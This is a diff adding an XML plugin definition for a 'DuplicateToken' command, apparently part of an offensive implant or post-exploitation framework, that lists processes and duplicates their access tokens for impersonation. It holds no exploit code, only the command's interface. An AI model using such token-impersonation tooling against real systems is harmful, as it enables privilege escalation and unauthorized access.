@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+<Plugin providerName='Tasking/Mcl_Cmd_DuplicateToken_Tasking.pyo' providerType='script'>
+
+    <Command name="DuplicateToken" id="0">
+
+		<Help>Lists and duplicates process tokens for impersonation.</Help>
+		
+		<Input>
+			<Option name='list' optional='false' group='cmd'>
+				<Help>List the current processes and their users</Help>
+				<Set data="cmd" value="1"/>
+			</Option>
+			
+			<Option name='duplicate' optional='false' group='cmd'>
+				<Help>Duplicates the access token from the given process</Help>
+				<Set data="cmd" value="2"/>
+				<Argument name="processId" data="processId"/>
+			</Option>
+		</Input>
+		
+		<Output>
+			<Data name='cmd' type='uint8_t'/>
+			<Data name='processId' type='uint32_t'/>
+		</Output>
+		
+    </Command>
+</Plugin>
